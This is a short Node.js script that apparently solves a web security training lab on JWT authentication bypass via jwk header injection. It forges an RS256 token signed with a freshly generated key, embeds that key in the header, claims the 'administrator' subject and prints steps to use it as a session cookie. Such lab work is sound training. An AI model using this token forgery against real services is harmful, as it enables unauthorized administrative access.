import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { JWT } from "../utils/JWT.js";
import { generateKeyPairSync } from "node:crypto";

const { labUrl } = getParsedInputFromUser({
  description: "Lab: JWT authentication bypass via jwk header injection",
  allowProxy: true,
});

runTasks([task]);

function task() {
  console.log(`
To solve the lab:
  1. Edit your browser cookie for the lab site with key "session" and value "${createAdminJwtWithJwkInjected()}"
  2. Go to admin page:
  "${labUrl}admin"
  3. Delete carlos's account
`);
}

function createAdminJwtWithJwkInjected() {
  const { publicKey, privateKey } = generateKeyPairSync("rsa", {
    modulusLength: 2048,
  });
  const jwk = publicKey.export({ format: "jwk" });
  const header = { alg: "RS256", jwk };
  const payload = { sub: "administrator" };
  return new JWT({ header, payload }).signWithPrivateKey(privateKey);
}
